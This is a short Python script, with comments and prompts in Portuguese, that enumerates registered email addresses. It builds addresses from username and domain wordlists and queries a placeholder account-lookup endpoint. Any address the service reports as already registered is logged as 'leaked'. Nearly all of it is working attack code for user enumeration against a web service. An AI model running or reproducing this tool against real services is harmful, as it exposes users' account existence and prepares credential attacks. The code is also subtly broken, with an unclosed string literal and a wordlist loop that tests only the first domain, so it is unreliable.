#!/usr/bin/python3
#
# Brute-force Tool for EMAIL Checking
# By: Israel Comazzetto dos Reis

import requests
from time import sleep

class massBrutevr(object):
    wordlist_email = "wl_email"
    wordlist_domain = "wl_domain

class massBrute(object):

    def __init__(self, opcao):
        self.opcao = opcao
    
    def execute_brute_force(self):
        self.emails_leaked = []
        emails_users = open(massBrutevr.wordlist_email, "r")
        wl_domains = open(massBrutevr.wordlist_domain, "r")
        sleep(3)
        print("[+] Armazenando payloads... [+]")
        print("[+] Iniciando scan... [+]")
        for domain in wl_domains.readlines():
            for email in emails_users.readlines():
                payloads_with_new_line = (f"{email}@{domain}")
                payload = payloads_with_new_line.replace('\n','')
                print(payload)
                urls_with_new_line =  (f"https://url/v1/users/email?email={payload}")
                url = urls_with_new_line.replace('\n','')
                flood_request = requests.get(url)
                response_server = flood_request.text
                if "E-mail já cadastrado" in response_server:
                    self.emails_leaked.append(payload)
                    leaked = str(self.emails_leaked)
                    print('[*] E-MAIL LEAKED [*] - '+leaked+'')
        sleep(3)
        print("[+] Scan finalizado com sucesso [+]")
        emails_users.close()
        wl_domains.close()

    def IniciaMassBrute(self):
        if self.opcao == "s":
            print("[*] Iniciando massBrute.... [*]")
            inicia = massBrute(self.opcao)
            inicia.execute_brute_force()
            print("[+] massBrute finalizado com sucesso... [+]")
        else:
            exit()


opcao_usuario = str(input("Iniciar massBrute? *Digite [s] para SIM / [n] para NAO* >> "))
if opcao_usuario == 's':
    user_options = massBrute(opcao_usuario)
    user_options.IniciaMassBrute()
else:
    exit()
